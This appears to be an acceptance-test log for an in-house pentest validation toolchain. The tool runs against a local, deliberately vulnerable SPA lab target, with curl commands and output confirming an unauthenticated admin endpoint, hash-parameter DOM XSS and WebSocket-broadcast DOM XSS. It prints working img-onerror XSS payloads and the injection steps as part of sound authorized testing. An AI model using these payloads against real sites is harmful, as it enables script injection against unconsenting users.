# SPA 验证验收实跑(T2-2b-3-5/6) — 2026-09-30

- 性质: **集成验收实跑**(非单测) — 真实靶场 + 真实 cdp-proxy 受控浏览器 + 真实 validator 验证环, 全部命令与输出为本文记录时的实跑原文
- 靶场: `tests/golden-targets/spa/`(:8894, golden truth 见 `baseline.md`); 验证通道: `plugin/pentest-dsh/validator.js`(上轮定稿: parseAssertions/evaluateAssertions/cdpDom/cdpPerf/HAR sink) + `scripts/browser/cdp-proxy.mjs`(:8893); 渲染通道: `scripts/gateway/spa-render.mjs`
- DSL 语汇权威: `docs/assertion-dsl.md`(本文是它的执行级实证); 断言 DSL + HAR 证据链 + 常驻(d2d-cdp-proxy.service)同批交付
- 本批红线: **V2/V3 必须执行级(DOM/帧证据)** — V2 以 `window.__xss===42` + 注入节点 DOM 快照实证, V3 以第二 WS 客户端发帧 + 页面 `window.__wsx===7` + `.ws-msg` 注入节点实证, 均达成(§2.2/§2.3)

## 0. 实跑方式(生产零打扰)

| 组件 | 起法 | 说明 |
|---|---|---|
| SPA 靶场 | `D2D_DATA_DIR=/tmp/d2d-spa-verify-accept/data bash scripts/ops/spa-start.sh start` | pid 1997371, :8894, 就绪判据 `/api/notes=401` `/=200` 通过(连 pid/log 都指临时数据根) |
| cdp-proxy(本地) | `HOME=<tmp>/home D2D_DATA_DIR=<tmp>/data P2P_CDP_PROXY_PORT=8893 P2P_PROXY_URL=off P2P_GRAPHD=http://127.0.0.1:1 nohup node scripts/browser/cdp-proxy.mjs &` | pid 1997495。**独立 HOME=mktemp**(照 `plugin/pentest-dsh/test/browser-recon.test.mjs:68-76` runProxy 范式: token 文件 `<HOME>/.config/d2d/{host,worker}-token` 现生成 64-hex 随机值, 绝不引用真实凭据); `P2P_PROXY_URL=off` 退直连(生产 egress :8888 未监听, 靶场流量本就在 scope 内); `P2P_GRAPHD` 指死口 → refreshScope 零生产 graphd 接触 |
| 池 chrome | cdp-proxy 首个业务调用懒拉起(cdp-proxy.mjs:110-125) | `POST /new about:blank` 探针触发 → `/health` 返回 `"cdp":"http://127.0.0.1:9695"`(端口 = 9400 + proxy pid%400); per-engagement profile `user-data-dir=<tmp>/data/cdp-profiles/default` |
| spa-render(本地) | `HOME=<tmp>/home P2P_SPA_PORT=18892 D2D_DATA_DIR=<tmp>/data P2P_CDP_URL=http://127.0.0.1:9695 nohup node scripts/gateway/spa-render.mjs &` | pid 1998493。**P2P_CDP_URL 附着池 chrome, 不回退**(spa-render.mjs:104-111: 附着端探活失败即 `null`, 绝不自拉第二 chrome); 生产 `d2d-spa.service`(:8892, pid 1176, Sep28 起)**不重启不改**, 端口 18892 + 独立 DATA_DIR 全隔离 |
| 鉴权 | cdp-proxy 业务端点 `X-Auth: <tmp token>`; spa-render `/render` 同理(读 `<HOME>/.config/d2d/host-token`, spa-render.mjs:27) | 所有命令以 `HT=$(cat <tmp>/home/.config/d2d/worker-token)` 从文件读, 全文零凭据字面量 |

前置探测: `8893/8894/18892` 空闲(`ss -tln`), 生产单元 7 个 active(d2d-dsh-web/graphd/mitm/oast/osint-feed/sentinel/spa), 生产池 chrome(pid 356380, :9409, `~/.d2d-data/spa-profile`)与本验收栈无交集。

## 1. 三行判定

| # | 漏洞 | 动作序列 | 断言结果 | 证据文件 | 判定 |
|---|---|---|---|---|---|
| V1 | `/api/admin/stats` 无鉴权 | validator `validateFinding`(L1, authorizedSet={127.0.0.1:8894}) → cdp-first 通道 → cdp-proxy `/new`+`/eval`+`/close` 重放 | `verified:true, reached:true, gate:'verified', verdict:'l1-passed'`; reason=`cdp replay ok in 785ms (channel=cdp)` | `<tmp>/runs/evidence/har/acc-v1-001.har`(加密 HAR, `readEvidenceFile` 读回实证 §2.1) | **confirmed(执行级: validator 通道)** |
| V2 | `#/search?q=` innerHTML DOM XSS | cdp-proxy `/new` SPA 壳 → `/navigate #/search?q=<img src=x onerror=window.__xss=42>` → `/eval` 轮询 | poll#2 起 `window.__xss===42` + `document.querySelector('#app img')` = `<img src="x" onerror="window.__xss=42">`(真实 DOM 节点, 非 echo) | `<tmp>/ev/v2-domsnapshot.html`(全文快照 1793B, 注入节点在 `<h3>结果: …` 内) | **confirmed(执行级: JS 执行 + DOM)** |
| V3 | `/ws` 广播 DOM XSS | `/navigate` 页面加载(connectWs 自连) → 独立 node 客户端连 `ws://127.0.0.1:8894/ws` 发标记帧 → `/eval` 轮询 | poll#1 起 `window.__wsx===7` + `document.querySelectorAll('.ws-msg').length=2` + 注入节点 `<img src="x" onerror="window.__wsx=7">`; ws-client 收到广播回显帧 | `<tmp>/ev/v3-domsnapshot.html` + `<tmp>/ev/v3-wsclient.log`(帧交互原文 §2.3) | **confirmed(执行级: 帧交互 + DOM)** |

- 证据根 `/tmp/d2d-spa-verify-accept/` 实跑后**保留**(HAR 复读回验可复现, §2.1); 审阅后可 `rm -rf`。
- HAR 证据链形态说明: validator 通道只在 `validateFinding` 路径产 HAR — V1(纯通道)与 V2 补证(§2.4 DSL 端到端)各有 `.har`; V2 主判/V3 是 cdp-proxy REST 直驱(不经 validator), 证据形态为 DOM 快照/帧交互原文(§2.2/§2.3), 这是通道设计使然而非缺证据。

## 2. 逐项证据(实跑原文)

### 2.1 V1 — validator 通道 + HAR 证据链(加密落盘 → readEvidenceFile 读回)

```console
$ HOME=<tmp>/home D2D_CDP=1 D2D_CDP_PROXY=http://127.0.0.1:8893 \
  D2D_EVIDENCE_KEY_FILE=<tmp>/home/.config/d2d/host-token \
  node --input-type=module -e '
    const { validateFinding } = await import("file:///home/kali/d2d/plugin/pentest-dsh/validator.js");
    const q = async () => [];                       // 图旁路 mock: guardedGateSet 直写走 .catch 空转
    const finding = { id: "acc-v1-001", severity: "medium", category: "probe",
      repro: "curl http://127.0.0.1:8894/api/admin/stats",
      title: "V1 golden: /api/admin/stats unauthenticated (acceptance)" };
    const res = await validateFinding(q, finding, {
      level: "L1", authorizedSet: new Set(["127.0.0.1:8894"]),
      runsBase: "/tmp/d2d-spa-verify-accept/runs", log: (...a) => console.error("[vlog]", ...a) });
    console.log("V1_RESULT=" + JSON.stringify(res, null, 2));'
V1_RESULT={
  "id": "acc-v1-001",
  "verified": true,
  "reached": true,
  "gate": "verified",
  "level": "L1",
  "verdict": "l1-passed",
  "reason": "cdp replay ok in 785ms (channel=cdp)"
}
$ ls -la <tmp>/runs/evidence/har/
-rw-rw-r-- 1 kali kali 2388 Sep 30 13:03 acc-v1-001.har
```

落盘即密文(evidence-crypto AES-256-GCM, KEK=SHA-256(token 文件原文)), `readEvidenceFile` 认证读回:

```console
$ node -e 'import evidence-crypto.mjs; …'
RAW_HEAD(encrypted form): {"v":1,"alg":"aes-256-gcm","iv":"Oa7CvCPhjDUYgfrG","tag":"7wfg+mkXnUGWn8panT3VWA==","ct":"QzzCag7z7eIIT/ZzT1spa8Aaw9NlRi ..."}
DECRYPTED_OK log.version= 1.2 | creator= {"name":"d2d-validator","version":"0.2.0"}
entry.request.method= GET | url= http://127.0.0.1:8894/api/admin/stats
entry.response.status= 200 | mimeType= undefined
entry.dom length= 281 | dom contains /api/admin/stats json: true
entry.waterfall entries= 3
dom excerpt: "<html><head>…</head><body><pre>{\"service\":\"golden-spa-target\",\"uptime_s\":119,\"ws_connections\":0,\"notes\":3,\"warning\":\"V1 故意漏洞: 本接口无鉴权, 前端路由守卫仅是客户端摆设\"}</pre>…"
# 错密钥读回(0x00*64) → GCM 认证拒绝:
WRONG_KEY_REJECTED: Unsupported state or unable to authenticate data
```

V1 判定材料: L1 授权硬门放行(host:port 精确命中)→ CDP 通道重放 200(DOM 含 JSON 明文)→ `gate='verified'`; HAR 密文落盘 + 认证读回 + 错密钥拒读 = 证据链三要素(落点/加密/逃生见 docs/assertion-dsl.md §④; 本跑未用 ENC=0 逃生)。

### 2.2 V2 — DOM XSS 执行级(/navigate → /eval: JS 执行值 + 注入节点)

```console
$ HT=$(cat <tmp>/home/.config/d2d/worker-token); PX=http://127.0.0.1:8893
$ curl -s -X POST $PX/new -H "X-Auth: $HT" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:8894/"}'
{"ok":true,"targetId":"11F106D49817488D3FF975344920EE26"}
$ curl -s -X POST $PX/navigate -H "X-Auth: $HT" -H 'Content-Type: application/json' \
    -d '{"target":"11F106D…","url":"http://127.0.0.1:8894/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D42%3E"}'
{"ok":true}
$ curl -s -X POST $PX/eval … -d '{"target":"…","expression":"JSON.stringify({xss: window.__xss ?? null, img: (document.querySelector('"'"'#app img'"'"')||null)?.outerHTML ?? null, hash: location.hash})"}'
poll#1: {"ok":true,"value":"{\"xss\":null,\"img\":null,\"hash\":\"#/search?q=%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D42%3E\"}"}
poll#2: {"ok":true,"value":"{\"xss\":42,\"img\":\"<img src=\\\"x\\\" onerror=\\\"window.__xss=42\\\">\",\"hash\":\"#/search?q=%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D42%3E\"}"}
poll#3-16(0.5s 步进): 恒定 {"xss":42, img 同上}   ← 执行态稳定
```

DOM 快照(`#app` innerHTML 实测, 注入节点加粗示义):

```html
<h2>搜索(V2: q 原样回显 + innerHTML 渲染)</h2><form class="card"><input id="search-q" …>…</form>
<div class="card"><h3>结果: <img src="x" onerror="window.__xss=42"></h3><ul></ul></div>
```

- 全文快照 `<tmp>/ev/v2-domsnapshot.html`(1793B)含 `<h3>结果: <img src="x" onerror="window.__xss=42"></h3>`(grep 命中原文)。
- 判定材料: `window.__xss===42` 是 payload **执行后的全局副作用**(HTTP 面永不产出 — baseline.md §3.2 盲区实证), 注入节点存在于 `#app` 内(app.js:175 `result.innerHTML` sink 实弹)→ confirmed。执行器: cdp-proxy `/navigate`+`/eval`(cdp-proxy.mjs:245-253); 服务端载体回显与 spa-recon-acceptance.md §2.2 互证。

### 2.3 V3 — WS 帧注入执行级(第二客户端发帧 → 页面渲染 → 注入节点)

页面经 cdp-proxy `/new http://127.0.0.1:8894/#/login` 加载(targetId `B66DF20ED271ACCB8CF7AB579FCAB471`), `connectWs()`(app.js:214)自连后页内 WS 状态:

```
$ /eval document.getElementById('ws-feed').textContent
{"ok":true,"value":"[sys] 已连接 /ws(广播消息 innerHTML 渲染 — V3)"}
```

独立 node 客户端(node v24.19.0 内置 global WebSocket, RFC6455 客户端帧掩码由协议栈强制)发标记帧, 帧交互原文(`<tmp>/ev/v3-wsclient.log`):

```
[ws-client] open → send: <img src=x onerror=window.__wsx=7>
[ws-client] recv frame: <img src=x onerror=window.__wsx=7>     ← 服务端原样广播(含发送者回显, spa-server.mjs:333-339)
```

页面侧 /eval 轮询(poll#1 即命中 — 广播先于首轮到达):

```
poll#1: {"ok":true,"value":"{\"wsx\":7,\"msgs\":2,\"injected\":\"<img src=\\\"x\\\" onerror=\\\"window.__wsx=7\\\">\",\"feedText\":\"[sys] 已连接 /ws(广播消息 innerHTML 渲染 — V3)\"}"}
```

DOM 快照(`#ws-feed` innerHTML 实测 + 全文快照 grep):

```html
<div class="ws-msg sys">[sys] 已连接 /ws(广播消息 innerHTML 渲染 — V3)</div>
<div class="ws-msg"><img src="x" onerror="window.__wsx=7"></div>   ← 帧内容原样进 DOM(app.js:203 insertAdjacentHTML sink)
```

- `<tmp>/ev/v3-domsnapshot.html`(1946B)含 `<div class="ws-msg"><img src="x" onerror="window.__wsx=7"></div>`; `document.body.innerHTML.includes('ws-msg') = True`。
- 判定材料: 发送方在**页面进程之外**(独立 node 客户端), 注入经 `/ws` 帧 → 服务端广播 → 页面 WS onmessage → innerHTML → `window.__wsx===7` 执行副作用 + 真实 `.ws-msg img` 节点 — 帧交互 + DOM 双证据, WS 面盲区(baseline.md §3.3)以执行级闭合 → confirmed。

**边界观察(如实记录, 不属本批改动)**: 本跑经 cdp-proxy 驱动的页面其 `ws://` 握手未被 Fetch 闸拦停 — 页面 WS 正常连接, `<tmp>/data/evidence/cdp/audit.jsonl` 零 `ws://` 记录(chromium 150 实测 Fetch.enable 未对 WebSocket 握手发 requestPaused)。注意 `scope-match.mjs:14` 对非 http(s) 恒拒 — 该闸当前只实际作用于 http(s) 面; `ws://` 出网治理面是否需要补强属 cdp-proxy 安全边界议题, **本批零触碰**(禁区文件), 留 upstream。

### 2.4 DSL 端到端补证 — status + selector_exists 经 validator 全链 HIT

V2 主判之外的 DSL 全链实证(同一池 chrome): `validateFinding` 带 DSL 对象断言数组, 走 parseAssertions → cdpReplay 选择器页内评估(cdpSelectorExpr 第二次 /eval)→ evaluateAssertions 合取判定 → HAR 落盘:

```console
$ node --input-type=module -e '… assertions = [{type:"status",value:200},{type:"selector_exists",selector:"#login-user"}]; … repro:"curl http://127.0.0.1:8894/#/login" …'
PARSED_ASSERTIONS= [{"type":"status","value":200},{"type":"selector_exists","selector":"#login-user"}]
DSL_RESULT={
  "id": "acc-v2-dsl-001", "verified": true, "reached": true,
  "gate": "verified", "level": "L1", "verdict": "l1-passed",
  "reason": "cdp replay ok in 814ms (channel=cdp); assertion=HIT(status=200|selector_exists=#login-user)"
}
$ readEvidenceFile(<tmp>/runs/evidence/har/acc-v2-dsl-001.har, keyFromFile(token 文件))
DECRYPTED_OK url= http://127.0.0.1:8894/#/login | response.status= 200
dom contains login form: true | dom len: 1882 | waterfall: 8
```

- `status=200` 走 **navStatus**(CDP 真实导航状态, 非 cdpReplay 出口哨兵), `selector_exists` 走页内 `document.querySelector` — 两型经 CDP 通道合取 HIT(docs/assertion-dsl.md §① 实证); html_contains/json_path/regex 与字符串数组兼容形态由单测锁定(§测试), MISS/管道态语义见同文 §③。
- 产物: `<tmp>/runs/evidence/har/acc-v2-dsl-001.har`(8704B, 加密, 含登录页 DOM 快照 + waterfall 8 条)。

## 3. 双 chrome 合并验证(T2-2b-3-6, 附注)

spa-render 以 `P2P_CDP_URL` 附着 cdp-proxy 池 chrome 前后, 主浏览器进程(判据: 带 `--remote-debugging-port` 且无 `--type=` 子进程 flag; 子进程会继承父 flag 故必须按主进程计数):

```console
$ ps -eo args | grep 'remote-debugging-port=' | grep -v -- '--type=' | grep 'user-data-dir=/tmp/d2d-spa-verify-accept' | grep -v grep | wc -l
1                                        ← 附着 spa-render 前
$ ps -eo pid,args | grep 'remote-debugging-port=' | grep -v -- '--type=' | grep -v grep
 356380 … --remote-debugging-port=9409 --user-data-dir=/home/kali/.d2d-data/spa-profile …   ← 生产 d2d-spa 池(Sep28 起, 未触碰)
1997655 … --remote-debugging-port=9695 --user-data-dir=/tmp/d2d-spa-verify-accept/data/cdp-profiles/default --no-first-run --no-sandbox --disable-gpu --window-size=1440,900 --disable-quic …   ← 本验收栈唯一 chrome
$ (附着 spa-render 之后再数) wc -l → 1                ← 仍 1, 未新增
$ curl -s http://127.0.0.1:18892/health   (spa-render)
{"ok":true,"ready":true,"chrome":"http://127.0.0.1:9695"}
$ curl -s http://127.0.0.1:8893/health    (cdp-proxy)
{"ok":true,"ready":true,"eng":"default","cdp":"http://127.0.0.1:9695","scope":0,"profiles":"/tmp/d2d-spa-verify-accept/data/cdp-profiles/default"}
```

- **单 chrome 实例 CDP 端口唯一**: 本验收栈全程恰 1 个主 chromium(pid 1997655), 唯一 CDP 端口 9695; cdp-proxy `/health` 的 `cdp` 字段与 spa-render `/health` 的 `chrome` 字段**同一端口** — 治理面(cdp-proxy)与侦察面(spa-render)共用同一 chrome 同一 per-eng profile, 双 chrome 合并实证闭合(spa-render.mjs:8 附着语义, 不回退: 附着端探活失败即不可用, 绝不自拉)。
- 全机第二个 chrome(pid 356380, :9409)属生产 `d2d-spa.service`, 与本栈零交集(不同 user-data-dir), 全程未触碰。

## 4. 清理(实跑)

```console
$ kill 1997495 1998493        # cdp-proxy(:8893) + spa-render(:18892) — exit 钩子释放各自锁(cdp-proxy.mjs:99/spa-render.mjs:89 只释放自持锁)
$ kill 1997655                # ⚠️ 补杀池 chromium(:9695) — cdp-proxy 对自拉 chrome 未绑生命周期, 父退后成孤儿(recon 验收同款教训)
$ D2D_DATA_DIR=<tmp>/data bash scripts/ops/spa-start.sh stop   # → [spa] 已停止(pid 1997371)
$ 复核: ps 'user-data-dir=/tmp/d2d-spa-verify-accept' → (none); 'cdp-proxy.mjs|spa-render.mjs' 仅余生产 1176
$ ss -tln | grep -E ':(8893|8894|18892|9695)' → (空)           # 端口全释放
```

生产单元收尾核对(`systemctl --user list-units 'd2d-*'`): dsh-web/graphd/mitm/oast/osint-feed/sentinel/spa 七单元 active, pid 1176(:8892)/pid 356380(:9409)原样 — **全程未重启未改**。证据根 `/tmp/d2d-spa-verify-accept/`(含 2 份加密 HAR + DOM 快照 + 帧交互日志)保留供复读, 审阅后可删。

## 5. 常驻交付(d2d-cdp-proxy.service)与启用步骤

- 新单元 `scripts/systemd/d2d-cdp-proxy.service`(照 d2d-egress.service 风格: `ExecStart=/usr/bin/node %h/d2d/scripts/browser/cdp-proxy.mjs`、`WorkingDirectory=%h/d2d`、`Restart=on-failure`; **不设 `Environment=D2D_CDP`** — cdp-proxy 进程自身无该开关语义, 那是 validator 侧)已过 `systemd-analyze verify`(exit 0)。
- 本批**未启用生产 systemd 单元**(8893 空闲收场)。启用是操作者动作, 手工步骤(同单元头注释):
  `bash install.sh` → `systemctl --user enable --now d2d-cdp-proxy.service` → 验活 `curl -s http://127.0.0.1:8893/health`(免鉴权, ready=false 属正常 — 首个业务调用才懒拉起 chrome)。
- `install.sh` start-all 段同步反转: cdp-proxy 默认随 start-all 装起, `D2D_CDP=0` 逃生跳过(与 validator `resolveCdpChannel`「缺省启用/显式 0 关」同口径); systemd 单元安装循环(`*.service` 通配)自动收录新单元但不 enable。
- 测试: 六型 DSL 纯函数/cdpReplay 录制/HAR sink 单测在 `plugin/pentest-dsh/test/`; 本文件为集成验收实跑记录。
